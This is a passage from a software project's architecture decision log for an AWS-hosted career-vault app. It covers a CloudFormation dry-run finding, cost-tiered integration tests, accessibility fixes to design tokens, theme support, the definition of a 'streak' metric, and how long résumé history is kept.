list held one `REVIEW_IN_PROGRESS` row and the hooks array was empty — so the cause was isolated by
re-running the identical template with a single parameter changed. That is the diagnosis, and it is
conclusive: with `CheckinSenderAddress` pointed at a different address the change set builds cleanly.

**The blocker is `CheckinEmailIdentity` (template §816).** It creates an `AWS::SES::EmailIdentity`
from `CheckinSenderAddress`, which defaults to `oche.ocheobe@gmail.com` and — unlike
`CheckinConfigurationSet` immediately below it, named `careervault-checkins-${Environment}` — is
**not environment-suffixed**. An SES email identity is unique per account+region, and the dev stack
already owns this one, so a prod deploy in the same account collides with dev on a resource that
*cannot* be suffixed: the identity is literally the address.

So **the prod stack could never have deployed as configured**, and nothing would have revealed that
until someone tried it — which, under a "declare dev the MVP" decision, might have been much later
and under pressure. Logged as **B-021**.

**What the dry run confirmed, once unblocked:** the change set enumerates **70 resources**, and it
includes `BillingAlarmWarning` and `BillingAlarmCritical` — the prod-gated branch this ADR was
written to exercise. Both conditionals resolve and validate. The question the dry run was run to
answer is answered: *yes, the billing alarms are well-formed.* The empty `REVIEW_IN_PROGRESS` stack
was deleted afterwards; no resource was ever created and no charge incurred.

The general lesson is sharper than the specific bug. **A conditional that has never been evaluated is
not "probably fine", it is untested code** — and the cheapest possible test found a blocker on the
first run. It also refines this ADR's own claim: a dry run tests the template *and* the account's
existing state, which is more than "synthesizes and diffs" suggested.

### Cross-cloud parallel
`--no-execute-changeset` is CloudFormation's plan-without-apply, the same primitive as
`terraform plan`, Azure's ARM/Bicep `what-if`, and `gcloud deployment-manager --preview`. The
transferable habit is treating **environment count as a cost/benefit question rather than a ritual**:
the dev/staging/prod ladder exists to protect *users* from *changes*, so with one user who is also
the developer, the ladder is protecting nobody and still charging the sync tax.

---

## ADR-042: Integration tests are tiered by cost, with the expensive tier opt-in

**Status:** Accepted
**Date:** 2026-07-28 (slice 9)

### Context
Slice 9 owns the integration suite (arch §5.6). The obvious design — one suite, one command,
exercises everything — collides with a hard number: **a single résumé-agent run costs ~$0.31** and
the monthly ceiling is $5. A uniform suite would cost roughly **$0.35 per invocation**, meaning
**~14 runs would consume an entire month's budget**. That is not a suite anyone runs before a
commit; it is a suite that gets avoided, and an avoided test is worse than no test because it
carries false assurance.

The naive alternative — mock Bedrock everywhere — costs nothing and proves nothing that matters here.
The unit suite already mocks Bedrock (370 tests, all green). The *entire reason* to add integration
tests is to catch what mocks structurally cannot: that the real model returns output the real parser
accepts. Slice 8's own headline lesson is exactly this class of bug — Converse returned a response
omitting a `required` field, which no mock would ever have produced because the mock was written from
the schema. **A mock encodes the author's belief about the model; the bug lives in the gap between
that belief and the model.**

So the tension is real in both directions, and neither uniform answer survives it.

### Decision
Tier the suite by **cost**, and make cost a visible property of a test rather than a surprise:

| Tier | Marker | What it covers | Cost/run |
|---|---|---|---|
| **local** | *(default)* | DynamoDB Local — conditional writes, SK-prefix scoping, nested-`settings` merge | $0 |
| **cloud** | *(default)* | Deployed dev: auth, CRUD, settings, presign, check-in state machine with Bedrock stubbed at the seam | ~$0 |
| **bedrock** | `@pytest.mark.bedrock` | Real Converse round-trips — chat parse, Q&A, check-in composition (all Haiku) | ~$0.01 |
| **expensive** | `@pytest.mark.expensive` | Full résumé-agent run (Sonnet) | ~$0.11 measured |

`./scripts/run-integration.sh` runs **local + cloud** by default and is genuinely free — safe to run
on every change. `--bedrock` and `--expensive` opt the higher tiers in explicitly. The default is the
one that gets used, so the default must cost nothing.

The check-in flow (**B-018**) lands in **cloud**, not **bedrock**: slice 8's fallback ladder means the
scheduling logic — due-user Scan, slot claim, idempotency, cadence pacing, pause — is separable from
the composition call and is the part that actually regressed under manual testing. Testing the
state machine for free and the composition for a cent is a better split than testing both for a cent
or neither for free.

### Consequences
- ✅ The suite people actually run is free, so it is actually run.
- ✅ Cost becomes a **declared attribute of a test**. A future test that quietly adds a Sonnet call to
  the default tier now has to lie about its marker to do so.
- ✅ Real-model verification survives where it earns its price (Haiku, ~$0.01) rather than being
  dropped wholesale to protect the budget.
- ⚠️ The default tier stubs Bedrock at a seam, so it inherits the mock-drift risk the `bedrock` tier
  exists to catch. The mitigation is that the `bedrock` tier is cheap enough to run at every slice
  wrap — but it must actually be run, and nothing enforces that. Stated so it is a known gap, not a
  forgotten one.
- ⚠️ Four tiers is more machinery than a single-user MVP strictly needs, and the boundaries will
  blur under maintenance. Accepted because the alternative failure — a test suite too expensive to
  run — is unrecoverable, while over-organization is merely untidy.
- ⚠️ `expensive` will be run rarely, so the résumé agent stays the least-integration-tested Lambda
  despite being the most complex. That is a deliberate purchase of budget with coverage, and the
  right place to spend the coverage is the deterministic finalize phase, which needs no model at all.

**Measured on first green run (2026-07-29).** The `expensive` tier's own run came in at **72s /
20,183 tokens / $0.113** with a **2-entry** corpus and a `REVISE` critique — against slice 6b's
**176s / 82.9K tokens / $0.35** for a `REVISE` run over the real **13-entry** corpus. Same verdict,
same phases, so the gap is not a cheaper code path: **cost and latency scale with corpus size**,
because the retrieval loop re-sends a growing history each iteration (B-004). Two consequences worth
separating. For this ADR, the tier is cheaper than budgeted, so `--expensive` is more affordable than
"~14 runs to the ceiling" implied — but it is cheap *because the fixture corpus is small*, and it
must not be read as the agent getting cheaper. For B-020, this is the first direct evidence that
lever (c) — short-circuiting the agentic loop for small corpora — attacks cost and latency together.

One process note, since it is the reason the tier cost ~$0.34 rather than ~$0.11 to land: three runs
were needed, two of them lost to test bugs (`job_description` vs `target`, then `complete` vs
`completed`). Both were *contract* errors, and both are now guarded for **$0** in the `cloud` tier.
**On an endpoint this expensive, the request contract deserves a free test of its own** — otherwise
every typo is discovered at full price.

### Cross-cloud parallel
Marking tests by resource cost rather than by speed is the same instinct as pytest's conventional
`slow` marker, Go's `testing.Short()`, and Maven's failsafe/surefire split — but the axis is dollars,
not seconds. The transferable idea: **when a test consumes a metered external resource, the meter
belongs in the test's metadata.** Anything that costs real money to run should have to say so at the
point where someone decides to run it.

---

## ADR-043: Correct two design-handoff tokens that fail WCAG, using colours already in its palette

**Status:** Accepted
**Date:** 2026-08-07 (v1.1 slice 1)

### Context
The Claude Design handoff for the v1.1 redesign declares itself **high-fidelity**: *"Colors,
typography, spacing, radii, and interactions are final. Recreate pixel-accurately using the exact
values in the Design Tokens section."* It is a careful, thorough document — a full token table, per-
view specs to the pixel, and a state model.

It contains no accessibility section, states no contrast target, and was never measured. The
pre-redesign audit measured every token pair (see
[pre-redesign audit §B](design/v1.1-redesign/pre-redesign-audit.md)). Almost all of it passes
comfortably — `text-secondary` at 7.39–8.16, `accent-text` above 10, `success` and `danger` above
8.9. There are exactly **two** holes, and both are load-bearing:

1. **`text-faint` #6f6c88 fails AA on all four surfaces** (3.53–3.90 against a 4.5 requirement).
   There is no large-text exemption to fall back on: the handoff assigns this token to eyebrows,
   placeholders, timestamps, record numbers, the year-grid month axis and panel labels — **all
   specified at 10–11px**, far below the 18.66px-bold / 24px threshold. The smallest text in the
   design is also its lowest-contrast text.

2. **Keyboard focus is effectively unindicated.** The handoff specifies `outline: none` on inputs and
   signals focus purely by swapping the border `border-strong #2b2b46` → `border-active #4b3fa8`.
   That state change measures **1.68**, and the resulting border is **2.35** against the input it
   sits on — below the 3.0 that WCAG 1.4.11 requires for a non-text indicator, and failing 2.4.7
   (Focus Visible) outright.

Neither is visible by inspection; both required measurement. This is precisely why the enumeration
pass was retargeted to audit the *design* and not just the outgoing CSS.

The tension is real. "Match the exact tokens" is a reasonable instruction from a designer who has
made deliberate choices, and overriding it casually is how a reviewed design dies by a thousand
implementer preferences. But an instruction about *visual fidelity* cannot bind on *accessibility*,
because the designer was not making an accessibility claim — the handoff never mentions the subject.

### Decision
Deviate on exactly these two values, and **nowhere else**. Every other token ships verbatim.

| Token | Handoff | Ships as | Rationale |
|---|---|---|---|
| `--text-faint` | `#6f6c88` | **`#817e99`** | Hue (246.4°) and saturation (11.5%) held exactly; HSL lightness raised 47.8% → 54.6%. The **minimum** lift that clears 4.5 on all four surfaces (4.55 / 4.76 / 4.92 / 5.02). |
| focus indicator | `border-active` #4b3fa8, `outline: none` | **`accent` #7c6cff as a real ring** — `outline: 2px solid var(--accent); outline-offset: 2px` | Min **4.61** across all four surfaces vs 2.18. |

Two constraints on how the deviation is made, both deliberate:

- **No new colour is invented.** The focus fix uses `accent`, which is already in the handoff's
  palette. We are not introducing an implementer's colour into a reviewed design; we are using the
  right existing one.
- **The tonal ladder is preserved.** `#817e99` remains clearly fainter than `text-muted` #8b88a8,
  so the design's intended hierarchy of emphasis survives intact.

`border-active` keeps its handoff role for **hover**, which carries no contrast requirement.

### Consequences
- The design's smallest type becomes legible without changing its size, weight, or placement.
- Keyboard navigation becomes possible. The ring applies to buttons, chips and nav items too — not
  just inputs — which the handoff's border-swap approach could never have covered.
- A reviewer can diff our `:root` against the handoff's token table and find exactly two differences,
  both documented here. That auditability is the reason for the minimum-lift rule.
- **Knowingly accepted, not fixed:** the handoff's resting borders are hairlines
  (`border` #22223a on `surface` = **1.20**; `border-strong` on `surface-sunken` = **1.40**), which is
  thin against 1.4.11's identification requirement. Fixing it would mean rewriting the design's core
  visual language — low-contrast surfaces separated by hairlines *is* the aesthetic — and inputs are
  additionally identified by fill, placeholder and layout. Focus was fixed instead because focus
  communicates **state**, which is the half a user cannot reconstruct from context. Recorded so the
  choice is visible rather than overlooked. Same reasoning applies to the switch off-state (1.20) and
  the year-grid's colour-only encoding, both logged in the audit as low severity.

### Cross-cloud parallel
The general shape is a **spec that is authoritative within its domain and silent outside it** — the
same reason an OpenAPI document constrains payload shape but says nothing about rate limits, or a
Terraform module fixes resource topology but not the account's SCPs. The failure mode is treating
silence as permission. The discipline that makes the deviation safe is not the deviation itself but
its *boundedness*: two named values, measured, minimum-magnitude, sourced from the existing palette,
and written down before the code.

---

## ADR-044: Keep system-theme support; derive the light palette the handoff does not provide

**Status:** Accepted
**Date:** 2026-08-07 (v1.1 slice 1)

### Context
The handoff supplies **one palette, and it is dark** — the direction is explicitly a "data-centric
dark dashboard" (concept 1b "Momentum"). There is no light variant anywhere in the document.

The current app, however, **already follows the system theme**:
[`index.css`](../frontend/src/index.css) sets `color-scheme: light dark` and ships a full
`prefers-color-scheme: dark` block. Replacing that file wholesale with the handoff's dark-only
palette would therefore **remove a capability the app has today** — silently, as a side effect of a
visual redesign rather than as a decision anyone made.

Raised by Oche on review of the audit: keep it.

Two things make the timing matter more than the feature does:

- **The token layer is the only cheap moment.** Theming is a property of how tokens are declared. Get
  it right once in `index.css` and all six views inherit it for free; retrofit it after six views are
  built against a single-palette assumption and it means auditing every feature CSS file. The cost
  difference between doing this now and doing it later is roughly an order of magnitude.
- **It is not a mechanical inversion.** The semantic *structure* transfers cleanly — in both themes
  "elevated" is lighter than the page and "sunken" is darker than its card — but three things do not:
  the accent washes (`rgba(124,108,255,0.14)` reads as a whisper over near-black and as a bruise over
  white), the heatmap ramp (dark→pale must become pale→deep or "no activity" becomes the loudest
  cell), and every contrast pair, which has to be re-measured from scratch.

### Decision
Ship both themes, with **dark as the declared base**:

```css
:root            { /* the handoff's dark tokens, verbatim except ADR-043's two */ }
@media (prefers-color-scheme: light) { :root { /* derived light tokens */ } }
```

Dark on bare `:root` rather than the more conventional light-first, for a specific reason: **the
approved artifact is the dark design.** Putting its values unqualified on `:root` means a reviewer
can diff them against the handoff's token table line by line, and any browser that does not resolve
`prefers-color-scheme` falls back to the design as approved rather than to our derivation.

The light palette, every value validated at or above 4.5 for text and 3.0 for the focus ring:

| Token | Dark | Light | Worst text ratio (light) |
|---|---|---|---|
| `bg` | `#0b0b12` | `#f7f6fb` | — |
| `surface` | `#12121c` | `#ffffff` | — |
| `surface-sunken` | `#0e0e17` | `#f1f0f7` | — |
| `surface-raised` | `#16162a` | `#f4f2fd` | — |
| `text-primary` | `#f5f3ff` | `#14121f` | 16.33 |
| `text-body` | `#e8e6f2` | `#2a2740` | 12.68 |
| `text-secondary` | `#a8a4c0` | `#55516e` | 6.65 |
| `text-muted` | `#8b88a8` | `#615d7c` | 5.51 |
| `text-faint` | `#817e99` *(ADR-043)* | `#6a6682` | **4.84** |
| `accent` | `#7c6cff` | `#5b48d6` | 5.55 |
| `accent-text` | `#cbbcff` | `#5b3fd4` | 5.97 |
| `success` | `#8ad6b0` | `#1d7a4f` | 4.70 |
| `danger` | `#ff9d9d` | `#c2354a` | 4.75 |
| heatmap ramp | `#1a1a2c → #a58cff` | `#eae7f6 → #5b45c4` | ramp **inverted** |

The ramp inversion is the one place light is not a re-tint but a re-think: in dark, intensity reads
as *brighter*; in light it must read as *deeper*, or an empty week becomes the most prominent cell on
Home.

### Consequences
- An existing capability survives a redesign that would otherwise have quietly dropped it. That is
  the actual win here — this is **not-regressing**, not new scope.
- Every feature CSS file must reference tokens only. A raw hex in `chat.css` is a light-mode bug that
  will not show up in dark-mode review, which makes "no hex outside `index.css`" an enforceable slice
  exit criterion rather than a style preference.
- **The light theme is ours, not the designer's.** It has been held to the same contrast bar as dark
  and derived from the same hues, but it has not been through their eye. If it is later reviewed and
  revised, that revision lands in the token block alone.
- Two themes doubles the surface for visual regression. Mitigated by tokens being the only place
  colour is defined, but worth stating: any future palette change now has two answers to give.
- **`color-scheme: light dark` must be retained** so form controls, scrollbars and the UA's own
  chrome follow along. Dropping it produces the classic bug where a dark page renders white native
  scrollbars and light-mode `<select>` popups.

### Amendment (2026-08-09, v1.1 slice 3) — the user gets an explicit choice, stored per device

This ADR settled *which* themes exist and how the light palette is derived. It left the **selection**
implicit: the system decides, and the user cannot disagree with it. Raised by Oche — "some people may
want a different option from what the rest of their system is set to" — which is correct, and is the
ordinary expectation for any app that ships two themes.

**Amended decision:** Details gains a three-way control — **Light · Dark · System** — defaulting to
System, which is exactly today's behaviour. Four sub-decisions, each of which has a wrong answer that
looks fine in review:

1. **Stored in `localStorage`, not on the PROFILE.** Two independent reasons, either sufficient. The
   preference must apply **before first paint**, and a server round-trip cannot beat the first frame —
   a `GET /settings` round-trip guarantees the flash it is trying to prevent. And theme is genuinely
   *per device*: dark on a laptop and light on a phone in daylight is a legitimate configuration, not
   a sync failure. Costs **$0**, adds no endpoint, and does not touch ADR-040's nested-settings merge.
2. **Applied by an inline script in `index.html`, before the bundle loads.** Reading the preference in
   React means the page paints with the system theme and then flips — the flash-of-wrong-theme bug.
   The script sets `data-theme` on `<html>` synchronously; it is the one piece of app logic that
   deliberately lives outside the bundle, and the reason is ordering, not preference.
3. **One mechanism, not two.** The explicit choice is an attribute selector alongside the existing
   media query — *not* a migration to `light-dark()`. `light-dark()` is the modern answer and was
   considered first, but it accepts only **colours**, and five tokens (`--grad-primary`, `--grad-logo`,
   `--grad-user-bubble`, `--grad-bar-fill`, `--grad-streak-bar`) are whole `linear-gradient(…)`
   strings. Adopting it would convert ~40 tokens and leave the gradients on the old mechanism anyway —
   two mechanisms in the one file whose entire rule is that colour is defined in exactly one place.
   Rejected on consistency, not capability.
4. **`color-scheme` tracks the explicit choice.** This ADR already notes that dropping `color-scheme`
   gives white scrollbars on a dark page; an explicit override reintroduces the same bug in a new way
   if the property keeps reporting `dark light` while the page renders light.

**The cost this amendment accepts, and how it is paid.** Keeping one mechanism means the light palette
is declared **twice** — once under `@media (prefers-color-scheme: light)` and once under
`:root[data-theme="light"]`. That is a genuine hazard in this specific file: a future palette tweak
applied to one copy would silently desync the toggle from the system default, and the *system* path is
the one nobody clicks to check. It is paid for with a **test that parses `index.css` and asserts both
light definitions declare an identical token set with identical values** — the duplication is
permitted because it is enforced, not because it is harmless.

**Consequences:** the three-way default (System) means nothing changes for a user who never opens the
control. The `prefers-color-scheme` listener must stay live so a user on System still follows their OS
changing at sunset. And the toggle pays for itself immediately inside slice 3 — verifying six views ×
two themes × two widths becomes two clicks rather than an OS settings trip, which is what the slice's
own both-themes exit criterion requires anyway.

### Cross-cloud parallel
The pattern is **environment-derived configuration resolved at the edge of the system, not threaded
through it**: one declaration site, everything downstream reads a semantic name and stays ignorant of
which environment it is in. It is the same discipline as referencing an SSM parameter rather than an
account-specific ARN, or a CloudFormation `Mapping` keyed on region. The bug in every case is
identical in shape — a literal that happened to be correct in the environment where it was written.

The amendment adds a second, distinct pattern worth naming: **an explicit override layered over an
inherited default, with the inherited default preserved as a first-class choice.** "System" is not the
absence of a setting — it is a setting whose value is "follow that other source", which is why it must
remain selectable rather than merely being what you get before you choose. The same shape appears in
`AWS::NoValue` versus an explicitly-set parameter, and in a Lambda env var that overrides an SSM
lookup: the bug is collapsing "unset" and "inherit" into one state, after which a user who wants to go
back to following the system has no way to say so.

---

## ADR-045: Home's aggregates are derived client-side, and "streak" is defined here

**Status:** Accepted
**Date:** 2026-08-07 (v1.1 slice 1)

### Context
Home is the only genuinely new view in the redesign, and it is the only one that needs data the API
does not return. It asks for: total entry count, count this quarter, a 130-cell year-activity grid,
per-category counts, the four most recent entries, a **streak**, a résumé count, and a gap-analysis
sentence.

Most of that is already in the response to `GET /entries`, which returns every entry with
`entry_type`, `event_date` and `created_at` (embeddings stripped server-side). Counting, bucketing
and sorting that list is arithmetic, not retrieval.

Two things are genuinely absent, and they are absent for different reasons:

- **Résumé count / "Résumés built"** — there is no list endpoint at all. The API has
  `POST /resumes/generate` and `GET /resumes/{run_id}` and nothing else. Worse, `RESUMERUN` items
  carry a **30-day TTL** (ADR-037 / §3.2.5), so even with an endpoint a résumé history could not
  reach further back than a month. That collision needs its own decision and is out of this slice.
- **The gap-analysis line** ("*Light on certifications — three of your last four résumé targets asked
  for one*") needs résumé target history *and* an inference over it. Against a $5 ceiling where
  Bedrock is 87% of spend, a model call on every Home load is exactly the wrong shape.

### Decision

**1. Derive client-side, promote later if it hurts.** Everything computable from `GET /entries` is
computed in the browser from the response the view already fetches. No new endpoint, no new IAM, no
schema change, **$0** added cost. The corpus is 13 entries and ADR-028 already establishes that one
career is tens-to-low-hundreds of items.

This is a deliberate deferral, not an oversight: the promotion trigger is a corpus large enough that
per-load derivation is felt, at which point the aggregates move behind an endpoint on `career_crud`
and the view's data shape does not change. Recorded in the backlog rather than built now.

**2. "Streak" is defined as follows.** The design invented this concept; nothing in the data model
has it, so the definition is a product decision and belongs here rather than in whichever component
happens to implement it.

> A streak is the number of **consecutive completed cadence periods, counting backwards from the
> current one, in which at least one entry was created.**

Five details, each of which changes the number:

- **It counts `created_at`, never `event_date`.** A streak measures *the habit of logging*, not when
  things happened. Using `event_date` would let a user backfill a 2019 job and extend a 2026 streak,
  which inverts the meaning of the metric.
- **Period length follows the user's cadence**, reusing `CADENCE_DAYS` from
  [`checkin_schedule.py`](../backend/shared/python/careervault/checkin_schedule.py) — the same source
  that paces check-in emails, so the streak can never disagree with the thing that prompts it.
- **Periods are anchored to the calendar, not to "now".** ISO weeks for weekly, ISO week-pairs for
  biweekly, calendar months for monthly, calendar quarters for quarterly. A rolling window anchored
  to the current instant would make the streak drift day to day with no user action; the design
  already thinks this way, with its "week 31" eyebrow.
- **The current period cannot break the streak until it ends.** An unfinished period with no entry is
  neutral, not a miss. Otherwise every user's streak would read zero every Monday morning.
- **All four cadences are supported, including quarterly.** The design offers three options; the
  backend has offered four since slice 8 and `SettingsUpdate` validates against all four. The UI
  noun follows the cadence — week / fortnight / month / quarter.

**3. What cannot be derived is not faked.** B-015 is the precedent: the settings form shipped
`placeholder="Oche Obe"` and it was logged as a defect. Inventing a résumé count would be the same
mistake with more digits.

| Design element | This slice |
|---|---|
| "In the vault" + "entries since 2022" | Derived — count, and earliest `event_date` year. |
| "This quarter" + "up from N in Q2" | Derived — current and previous calendar-quarter counts. |
| **"Résumés built" + "last: \<title\>"** | **No data source.** Card slot is kept and filled with **"Longest streak"**, which is derivable from the same data and on-theme. Reverts to the designed content when a résumé list endpoint exists. |
| Year-in-wins grid | Derived — `created_at` bucketed into 26 fortnightly columns. |
| "Latest in the vault" | Derived — four most recent by `created_at`. |
| "Where the weight is" bars | Derived — counts per `entry_type`. |
| **Gap-analysis sentence** | **Omitted this slice.** Requires résumé history; a per-load Bedrock call is the wrong shape against the ceiling. |

Substituting the third stat card rather than dropping it is the smaller deviation: it preserves the
design's `repeat(3, 1fr)` grid and its visual rhythm, where removing a card would leave a
two-thirds-empty row that no one designed.

### Consequences
- Home ships this slice with no backend change whatsoever. The entire redesign of the shell and Home
  is a frontend diff, which keeps the review surface small and the deployment risk near zero.
- **One source of truth is preserved**, which the handoff calls out as load-bearing: saving an entry
  updates the stat cards, the year grid, the category bars and "Latest in the vault" together,
  because all four read the same derived array.
- The streak is now falsifiable. It has a written definition, so it can have unit tests — cadence
  boundaries, an empty corpus, a single entry, a gap of exactly one period, and the
  current-period-not-yet-over case.
- Two designed elements are visibly absent or altered. Both are recorded against the slice that can
  actually supply them, rather than being quietly approximated.
- The résumé-list endpoint and the `RESUMERUN` 30-day TTL question are now formally blocking the
  Résumés view, and that view cannot be honestly built until the TTL question is answered.

### Cross-cloud parallel
"Derive on read until it hurts, then materialise" is the ordinary progression from computed views to
materialised views — the same call as a SQL `VIEW` versus a summary table, or DynamoDB's choice
between recomputing an aggregate and maintaining it via a stream. The trap is materialising first:
you inherit invalidation, staleness and backfill before you have evidence you needed any of it. The
part worth carrying is the *trigger* — writing down what would have to be true to change the answer,
at the moment you make it, while the reasoning is still in your head.

---

## ADR-046: Résumé history is a durable record split from the ephemeral run trace

**Status:** Accepted
**Date:** 2026-08-08 (v1.1 slice 3)

### Context

The Résumés view is the last un-redesigned view, and it is the one that **cannot be built honestly
from what exists** (B-028). Two facts, both verified in the tree rather than recalled:

1. **There is no list endpoint.** `template.yaml` exposes exactly `POST /resumes/generate` and
   `GET /resumes/{run_id}`. The designed grid — a card per past résumé, "Built 12 Jul 2026 · 9
   records drawn" — has nothing to read.
2. **Everything a list would read expires in 30 days.** `resume_agent/handler.py` stamps
   `expires_at = now + 30 days` on every `RESUMERUN#` item, and the `ExpireGeneratedResumes`
   lifecycle rule expires `resumes/` S3 objects on the same clock.

So a naive list endpoint over `RESUMERUN#` would ship a "history" that silently empties itself every
month — on an app whose entire premise is that your career history is worth keeping.

**ADR-015's own amendment predicted this exact moment.** It set the flat 30-day artifact rule and
then wrote: *"If 'list past résumés' ships post-MVP, retention gets revisited alongside the
`GENERATED_RESUME` entity — at which point 'keep the newest N' becomes a query over records, not a
lifecycle predicate, and is trivial."* This ADR is that revisit.

The reframing that decides it: **the 30-day number was never a judgment about how long a résumé is
worth keeping.** It was chosen to stop a trace item outliving the artifacts it pointed at (ADR-015's
amendment, reason 2). It is a *coupling fix*, not a retention policy. Once a durable record exists,
the coupling that produced the number is gone, and the number has no independent justification.

### Decision

**1. Split the entity in two, along the line of what each thing actually is.**

| | `RESUMERUN#<run_id>` | `RESUME#<run_id>` |
|---|---|---|
| What it is | Agent run trace — phase log, token counts, cost, critique verdict | The résumé you built |
| Written | At `pending`, overwritten at terminal state | Once, **only on successful completion** |
| `expires_at` | Set — 30-day TTL, unchanged | **Omitted** — durable |
| Read by | `GET /resumes/{run_id}` poll | `GET /resumes` list |

Nothing about the table changes: the TTL is attribute-driven, so an item that omits `expires_at` is
simply never a deletion candidate. No GSI either — run IDs are ULIDs, so `RESUME#` items sort
chronologically under the user's partition and a `Query` with `ScanIndexForward=False` returns
newest-first for free. **ADR-028 holds comfortably.**

Writing `RESUME#` *only on success* is deliberate: "past résumés" should mean résumés that exist. A
failed run leaves a trace for debugging and no row in the user's history.

**2. Generated artifacts stop expiring.** The `ExpireGeneratedResumes` lifecycle rule is removed.
`ExpireRawUploads` (`uploads/`, 1 day) is untouched and unrelated — raw uploads are transient input,
not output the user made.

At one résumé a week, a year of HTML+PDF is ~5 MB — **under $0.0002/month**. This is the
CLAUDE.md cost reframing applied directly: the ceiling constrains *Bedrock call volume*, not storage,
and a decision that makes the app less useful to save $0.0002 is the wrong trade. The alternative —
durable record, expiring artifacts — was considered and rejected below.

**3. Write ordering, not a transaction.** The worker finalizes `RESUMERUN#` **first**, then writes
`RESUME#`. These are two `PutItem`s, not a transaction, so they can diverge; ordering chooses *which*
divergence happens. Finalizing the trace first means a crash between the two leaves the user with a
working poll, a downloadable résumé, and a missing row in a list — recoverable and cosmetic. The
reverse order would leave a history row for a run whose poll never reports `completed`, which is the
worse failure. `TransactWriteItems` would make both atomic for ~2× WCU on an operation that runs a
few times a month; the trigger to adopt it is a second consumer that must not observe the skew.

**4. `GET /resumes` returns a projection, not whole items.** `target_text` may be an entire pasted
job description. The list projects `run_id`, `created_at`, `target_title`, `entry_count` and
`status`; the full target text stays on the item for `GET /resumes/{run_id}` and for the gap analysis
B-030 will need. This is the B-013 mistake (reading payload a caller discards) declined in advance
rather than logged afterwards.

### What the design asked for that is *not* built

Per ADR-045's precedent — omit rather than fabricate:

| Design element | This slice |
|---|---|
| Status badges **Latest**, **New** | Built — both derivable (newest row; generated this session). |
| Status badges **Sent**, **Draft** | **Omitted.** Neither has any referent: there is no send path (ADR-015 — in-app download only) and no draft state. A badge that can never appear is decoration that implies a feature. |
| "Built 12 Jul 2026 · 9 records drawn" | Built — `created_at` and `entry_count` are both real. |
| Gap-analysis line (B-030) | Still not built, but **no longer blocked** — this ADR supplies the durable target history it needs. |

### Alternatives considered

- **Rolling 30-day window, honestly labelled** ("Your last 30 days"). Genuinely defensible and by far
  the cheapest — no data-model change at all. Rejected on what it permanently forecloses: a career
  vault whose résumé history evaporates monthly contradicts the product, and B-030's gap analysis
  ("three of your last four résumé targets asked for a certification") would be capped at a 30-day
  sample forever. The saving was one small `PutItem` per successful run.
- **Durable record, artifacts still expire at 30 days.** Keeps ADR-015's amendment untouched; older
  cards show "expired — regenerate". Rejected: it buys nothing measurable ($0.0002/month) and pays
  for it with a conditional UI state on the majority of rows, plus a regenerate that costs
  $0.11–$0.35 of Bedrock to reproduce a file we deleted to save a fraction of a cent. The cost
  asymmetry runs backwards.
- **Extend every TTL to a year instead of splitting.** One-line change, no new entity. Rejected: it
  keeps 30 days of agent exhaust — token counts, phase logs, critique verdicts — alive for a year
  alongside the thing worth keeping, and answers "how long is a résumé worth keeping?" with a number
  that still has no justification. The split is what makes each retention choice defensible on its
  own terms.
- **`GENERATED_RESUME` as ADR-015 originally named it.** Same idea; renamed `RESUME#` for consistency
  with the existing `ENTRY#`/`GOAL#`/`CONVO#` prefixes, none of which carry a verb.

### Consequences

- ✅ The Résumés view becomes buildable from real data, with no invented fields.
- ✅ **B-030 unblocks.** Durable `target_text` + `created_at` is exactly the substrate a gap analysis
  needs, and it accumulates from now on whether or not that feature is built.
- ✅ Retention now has two answers because there are two things: exhaust expires, output persists.
  Each is justified independently, which the single 30-day number never was.
- ⚠️ **Résumé history is now unbounded.** Correct for a single-user MVP; a multi-tenant future wants
  a cap or a user-initiated delete. ADR-027's hard-delete precedent applies when it does — noted, not
  built.
- ⚠️ Two writes on the completion path can diverge (see decision 3). Bounded to a missing list row.
- ⚠️ **ADR-015 is amended a second time.** Its delivery half — in-app HTML preview + PDF download, no
  email, no Drive — still stands unchanged. Only the retention half moves.

### Amendment (2026-08-09, same slice) — deletion, because this decision removed it

Raised by Oche on seeing the finished history grid: there is no way to remove a résumé. Correct, and
**this ADR is what created the gap.** Under the flat 30-day rule deletion was implicit — everything
left on its own — so nothing ever needed a delete affordance. Making résumés permanent silently took
that away, and "your résumés are kept" is only a feature if the user can also decide one should not
be. The Consequences section above anticipated it ("*a multi-tenant future wants a cap or a
user-initiated delete*") but scoped it to multi-tenant; that was wrong. A single user accumulating
targets they no longer want has the same need immediately.

**Amended decision:** `DELETE /resumes/{run_id}` removes the S3 artifacts, the `RESUME#` record and
the `RESUMERUN#` trace. **ADR-027 applies unchanged** — hard delete, gated by a UI confirm — so this
is that decision extended to a second entity, not a new one. Three details carry the weight:

1. **S3 first, then DynamoDB — the mirror image of §3's ordering, for the same reason.** There is no
   transaction across two services, so ordering chooses which inconsistency a crash leaves:
   - *Objects first:* the failure leaves a history row whose View/Download 404s — visible, annoying,
     and **recoverable**, because the row is still there to delete again and S3 deletes are
     idempotent.
   - *Record first:* the failure leaves objects nothing references and nothing will ever expire
     (this ADR removed the lifecycle rule), with no row left for the user to retry from. That is
     **unrecoverable**, and precisely B-039's failure mode.

   A visible retryable fault beats an invisible permanent one, so the objects go first — and the
   handler **returns 500 without touching the record** if they fail, rather than pressing on.
2. **The record delete is conditional; the trace delete is not.** `attribute_exists(SK)` lets a
   delete of an already-gone résumé answer 404 instead of a misleading success. The trace gets no
   such condition because its absence is the *normal* case past 30 days, and treating expiry as an
   error would fail the common path.
3. **New IAM: `dynamodb:DeleteItem` and `s3:DeleteObject` on `resumes/*`.** The S3 grant is
   prefix-scoped, so it cannot reach `uploads/`. The DynamoDB grant cannot be scoped at all — §4.2.3
   again, `LeadingKeys` covers the partition key only — so "this function deletes only `RESUME#` and
   `RESUMERUN#` items, never an `ENTRY#`" is enforced by there being no code path that builds an
   `ENTRY#` key, and by `ddb_helpers` owning key construction. A code invariant, stated as one.

**Consequences:** history is now bounded by user intent rather than by nothing at all, which retires
the "unbounded" caveat above. Deleting the résumé currently on screen resets the view, since its
presigned URLs point at objects that no longer exist. And B-039 shrinks but does not close: a *failed
record write* during generation can still orphan objects, which deletion cannot reach because no row
ever existed to delete from.

### Cross-cloud parallel

This is the **log-versus-record** distinction that every observability stack eventually forces: a
trace, a metric and a business record have different lifetimes and should not share a retention
policy just because one process emitted them. Cloud Logging/CloudWatch retention versus the row your
job wrote is the same split; so is a Kafka topic's `retention.ms` versus the compacted table
downstream. The failure mode this ADR corrects is the common one — **letting the debugging artifact's
lifetime set the product's**, because they were convenient to write together.

---

## Future ADRs (placeholders)

These decisions are anticipated and will be added as work progresses:

- **ADR-020** — Dashboard UX spec.
